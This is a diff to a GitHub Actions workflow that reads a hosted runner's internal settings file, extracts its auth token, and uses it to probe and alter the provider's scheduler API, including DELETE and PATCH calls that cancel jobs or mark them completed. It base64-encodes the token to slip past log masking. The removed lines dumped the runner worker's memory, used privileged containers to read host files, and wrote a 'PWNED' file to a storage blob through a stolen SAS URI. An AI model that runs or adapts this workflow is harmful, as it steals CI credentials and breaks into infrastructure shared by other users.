@@ -1,62 +1,62 @@
-name: HCAAuthProbe
+name: SchedulerAPIProbe
 on:
   push:
     branches: [main]
 permissions:
   contents: read
-  id-token: write
 jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: Extract HCA authToken and probe scheduler API
+      - name: Comprehensive scheduler API probe with fresh token
         run: |
-          echo '=== BYPASS LOG MASKING VIA BASE64 ==='
-          SETTINGS=$(cat /opt/hca/.settings 2>/dev/null)
-          echo SETTINGS_B64=$(echo $SETTINGS | base64 -w0)
+          SETTINGS=$(cat /opt/hca/.settings)
+          AUTH=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('authToken',''))")
+          SCHED=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('schedulerApiUrl',''))")
+          echo AUTH_LEN=${#AUTH}
+          echo SCHED=$SCHED
           echo ''
-          echo '=== DIRECT authToken EXTRACTION ==='
-          AUTH_TOKEN=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('authToken','NOT_FOUND'))")
-          echo AUTH_TOKEN_LEN=${#AUTH_TOKEN}
-          echo AUTH_TOKEN_B64=$(echo -n $AUTH_TOKEN | base64 -w0)
+          echo '--- POST /v1/request (job acquisition attempt) ---'
+          curl -s -w '\nHTTP:%{http_code}' -X POST -H "Authorization: Bearer $AUTH" -H 'Content-Type: application/json' -d '{}' "${SCHED}/request" 2>/dev/null | head -c 1000
           echo ''
-          echo '=== SCHEDULER API PROBE ==='
-          SCHED_URL=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('schedulerApiUrl',''))")
-          echo SCHED_URL=$SCHED_URL
-          echo '--- GET /v1 ---'
-          curl -s -w '\nSTATUS:%{http_code}' -H "Authorization: Bearer $AUTH_TOKEN" "${SCHED_URL}" 2>/dev/null | head -c 2000
+          echo '--- GET /v1/worker (correct form) ---'
+          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/worker" -X GET 2>/dev/null | head -c 1000
+          echo '--- POST /v1/worker ---'
+          curl -s -w '\nHTTP:%{http_code}' -X POST -H "Authorization: Bearer $AUTH" -H 'Content-Type: application/json' -d '{}' "${SCHED}/worker" 2>/dev/null | head -c 500
           echo ''
-          echo '--- GET /v1/worker ---'
-          curl -s -w '\nSTATUS:%{http_code}' -H "Authorization: Bearer $AUTH_TOKEN" "${SCHED_URL}/worker" 2>/dev/null | head -c 1000
+          echo '--- DELETE /v1/request (cancel job?) ---'
+          curl -s -w '\nHTTP:%{http_code}' -X DELETE -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null | head -c 1000
+          echo ''
+          echo '--- GET /v1/ping ---'
+          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/ping" 2>/dev/null | head -c 500
+          echo '--- GET /v1/health ---'
+          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/health" 2>/dev/null | head -c 500
+          echo '--- GET /v1/swagger ---'
+          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED%/v1}/swagger" 2>/dev/null | head -c 500
+          echo '--- GET /swagger/v1/swagger.json ---'
+          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED%/v1}/swagger/v1/swagger.json" 2>/dev/null | head -c 500
+          echo ''
+          echo '--- PATCH /v1/request (update job status?) ---'
+          curl -s -w '\nHTTP:%{http_code}' -X PATCH -H "Authorization: Bearer $AUTH" -H 'Content-Type: application/json' -d '{"status":"completed"}' "${SCHED}/request" 2>/dev/null | head -c 500
+          echo ''
+          echo '--- GET /v1/request/current ---'
+          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/request/current" 2>/dev/null | head -c 1000
+          echo ''
+          echo '--- GET /v1/requests ---'
+          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/requests" 2>/dev/null | head -c 1000
           echo ''
           echo '--- GET /v1/machines ---'
-          curl -s -w '\nSTATUS:%{http_code}' -H "Authorization: Bearer $AUTH_TOKEN" "${SCHED_URL}/machines" 2>/dev/null | head -c 1000
+          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/machines" 2>/dev/null | head -c 500
+          echo '--- GET /v1/pool ---'
+          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/pool" 2>/dev/null | head -c 500
+          echo '--- GET /v1/quota ---'
+          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/quota" 2>/dev/null | head -c 500
           echo ''
-          echo '--- GET /v1/jobs ---'
-          curl -s -w '\nSTATUS:%{http_code}' -H "Authorization: Bearer $AUTH_TOKEN" "${SCHED_URL}/jobs" 2>/dev/null | head -c 1000
+          echo '=== EXFIL FULL TOKEN B64 AGAIN (for analysis) ==='
+          echo AUTH_B64=$(echo -n $AUTH | base64 -w0)
           echo ''
-          echo '--- GET /v1/request (what HCA calls to get a job) ---'
-          curl -s -w '\nSTATUS:%{http_code}' -H "Authorization: Bearer $AUTH_TOKEN" "${SCHED_URL}/request" 2>/dev/null | head -c 1000
-          echo ''
-          echo '=== TRACE API PROBE ==='
-          TRACE_URL=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('traceApiUrl',''))")
-          echo TRACE_URL=$TRACE_URL
-          curl -s -w '\nSTATUS:%{http_code}' -H "Authorization: Bearer $AUTH_TOKEN" "$TRACE_URL" 2>/dev/null | head -c 500
-          echo ''
-          echo '=== PROVJOBD OVERRIDE JSON ==='
-          cat /opt/hca/provjobd_override.json 2>/dev/null || docker run --rm --privileged -v /opt/hca:/hca alpine cat /hca/provjobd_override.json 2>/dev/null || echo 'not found'
-          echo ''
-          echo '=== INSTALL DOTNET-DUMP AND DUMP RUNNER.WORKER ==='
-          WORKER_PID=$(pgrep -f Runner.Worker | head -1)
-          echo WORKER_PID=$WORKER_PID
-          dotnet tool install -g dotnet-dump --version 9.0.0 2>/dev/null || echo 'install attempt done'
-          export PATH=$PATH:$HOME/.dotnet/tools
-          which dotnet-dump 2>/dev/null || echo 'dotnet-dump still not found'
-          timeout 30 dotnet-dump collect -p $WORKER_PID -o /tmp/worker.dump 2>/dev/null && echo 'DUMP SUCCESS' || echo 'DUMP FAILED'
-          ls -la /tmp/worker.dump 2>/dev/null || echo 'no dump'
-          echo ''
-          echo '=== DIAGNOSTICS SAS URI - TEST WRITE ==='
-          DIAG_URL=$(docker run --rm --privileged -v /opt/hca:/hca alpine cat /hca/diagnostics.json 2>/dev/null | python3 -c "import json,sys; print(json.load(sys.stdin).get('sasUri',''))" 2>/dev/null)
-          echo DIAG_URL_LEN=${#DIAG_URL}
-          curl -s -w '\nSTATUS:%{http_code}' -X PUT -H 'x-ms-blob-type: BlockBlob' -d 'PWNED_BY_RUNNER_ESCAPE' "${DIAG_URL}/pwned.txt" 2>/dev/null | head -c 500 || echo 'sas write failed'
-          curl -s -w '\nSTATUS:%{http_code}' "${DIAG_URL}?restype=container&comp=list" 2>/dev/null | head -c 500
+          echo '=== WORKER WATCHDOG API ==='
+          WD_URL=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('watchdogTraceApiUrl',''))")
+          echo WD_URL=$WD_URL
+          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${WD_URL%/trace}/health" 2>/dev/null | head -c 500
+          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${WD_URL%/trace}/worker" 2>/dev/null | head -c 500
